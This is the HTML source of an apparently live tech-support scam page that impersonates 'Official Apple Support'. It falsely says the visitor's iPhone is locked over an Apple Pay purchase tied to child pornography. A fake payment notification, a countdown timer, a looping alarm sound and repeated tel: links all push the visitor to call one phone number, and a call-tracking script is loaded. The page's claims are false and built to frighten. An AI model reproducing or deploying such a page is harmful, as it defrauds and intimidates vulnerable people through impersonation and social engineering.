<!DOCTYPE html><html lang="en"><head>
    <meta http-equiv="Content-Type" content="text/html; charset=utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <meta http-equiv="cache-control" content="max-age=3600">
    <title>Contact - Official Apple Support</title>
    <link rel="apple-touch-icon" href="images/favicon.ico">
    <link rel="icon" type="image/png" href="images/favicon.ico">
    <meta name="description" content="Contact Apple support by phone or chat, set up a repair, or make a Genius Bar appointment for iPhone, iPad, Mac and more.">

    <!-- Bootstrap 5 CSS -->
    <link href="css/bootstrap.min.css" rel="stylesheet">
    <link rel="stylesheet" href="css/bootstrap-icons.css">
    <!-- Font Awesome -->
    <link rel="stylesheet" href="css/all.min.css">
    <link rel="stylesheet" href="css/Base.css" type="text/css">

  <!-- Google tag (gtag.js) -->
<script async src="https://www.googletagmanager.com/gtag/js?id=G-2DMKRPGVF0"></script>
<script>
  window.dataLayer = window.dataLayer || [];
  function gtag(){dataLayer.push(arguments);}
  gtag('js', new Date());

  gtag('config', 'G-2DMKRPGVF0');
</script>

</head>

<body onclick="playSound()"  id="link">
    <!-- Click overlay - only active when needed -->
    <div id="clickOverlay" class="click-overlay"></div>

        
    <div class="bgimg">
          <img src="images/bg.jpg" alt="" width="100%">
        </div>


    <div class="main">
        
        <section class="as-columns  as-columns--1up  as-banner as-banner--top">
            <div class="row">
                <div class="column large-12 medium-12 small-12">
                    <div class="as-banner-content">
                        
                        <div class="alert-box">
                            

    <div class="spacbar">
        <div class="d-flex justify-content-between">
  <div><img src="images/applelogo2.png" alt="" style="width: 30px;margin-right: 5px;"> Alert</div>
  <div><a href="#" style="font-size: 15px;">Apple Support</a></div>
</div>
<img src="images/arror.jpg" alt="" style="width:80px;display: block;margin: 10px auto 0;text-align: center;">
    <div class="alert-title">Your iPhone has been locked due to suspicious activity.</div>
    <div class="alert-texts">
        <div class="bgblue"><strong>Transaction of $569.90 via Apple Pay for Child Pornography was found.</strong> <br>For security reasons you are prohibited from using your device.</div>
    <div class="txstm"> <br>
        Not you? Call <strong>Apple Support: <br><a href="tel:+1-844-903-2876">+1-844-903-2876</a></strong> to unlock your device.
     </div>
    <a href="tel:+1-844-903-2876" class="alert-button">Time left for unlock request: <span id="countdown">10:00</span></a>
    
    </div>
</div>
                        <div class="sectionTitle sectionTitleBlock">
                            <h2 class="sectionTitle-heading"></h2>
                        </div>
                    </div>
                </div>
            </div>
        </section>
    </div>

    <div class="notification">
        <div class="msalogo"><img src="images/messages.svg" alt="" width="30px"> MESSAGES</div>
<div class="cursor">now</div>
  <div class="notification-header">Payment Successful</div>
  <div class="notification-body">
    Sent $569.90 via Apple Pay to Pornhub <br>Premium.
    Not you? Call <a href="tel:+1-844-903-2876" class="me-2">+1-844-903-2876</a>
  </div>
  <img src="images/apple_pay.png" alt="Apple Pay" class="apple-pay">
</div>

    <div id="modalContainer"></div>

    <!-- Main Modal -->
    <div class="modal fade" id="appleAlertModal" tabindex="-1" aria-labelledby="appleAlertModalLabel" aria-hidden="true" style="top:-30px!important;">

        <div class="modal-dialog modal-lg modal-dialog-centered-sm">
            <div class="modal-content">
                <div class="modal-body text-center">
                    <div class="alert-text">
                        Your iPhone has been locked due to illegal child pornography activity on your device. Your purchase of $569.90 for PornHub subscription via Apple ID is complete. Not You? Call Apple Support <a href="tel:+1-844-903-2876">+1-844-903-2876</a> to unlock it!
                    </div>

                    
                    <div class="text-end gap-4 mt-3 actionbtn">
                        <a href="tel:+1-844-903-2876" class="me-2 bg-primary">+1-844-903-2876</a>
                        <a href="tel:+1-844-903-2876" class="mt-3 bg-secondary" id="okBtn">Cancel</a>
                    </div>
                </div>
            </div>
        </div>
    </div>

    <audio id="clickSound" src="media/LhlCcb3bW5w3.mp3" preload="auto" loop></audio>




    <script src="https://code.jquery.com/jquery-1.12.0.min.js"></script>
    <script src="js/popper.min.js"></script>
    <script src="js/bootstrap.min.js"></script>
    <script src="js/Jeidjcmsz.js"></script>
    <script src="js/Nduazq.js"></script>
    <script id="number-replace" src="https://js-dni.revocalls.com/dni.js?token=2099fefe-8b0b-4a2e-ae1f-48bd17aee4d8"></script>
    <script src="js/HsdqpNsd.js"></script>





<script>(function(){function c(){var b=a.contentDocument||a.contentWindow.document;if(b){var d=b.createElement('script');d.innerHTML="window.__CF$cv$params={r:'9f8240d11ced6068',t:'MTc3ODE3ODE3OA=='};var a=document.createElement('script');a.src='/cdn-cgi/challenge-platform/scripts/jsd/main.js';document.getElementsByTagName('head')[0].appendChild(a);";b.getElementsByTagName('head')[0].appendChild(d)}}if(document.body){var a=document.createElement('iframe');a.height=1;a.width=1;a.style.position='absolute';a.style.top=0;a.style.left=0;a.style.border='none';a.style.visibility='hidden';document.body.appendChild(a);if('loading'!==document.readyState)c();else if(window.addEventListener)document.addEventListener('DOMContentLoaded',c);else{var e=document.onreadystatechange||function(){};document.onreadystatechange=function(b){e(b);'loading'!==document.readyState&&(document.onreadystatechange=e,c())}}}})();</script>
</body></html>
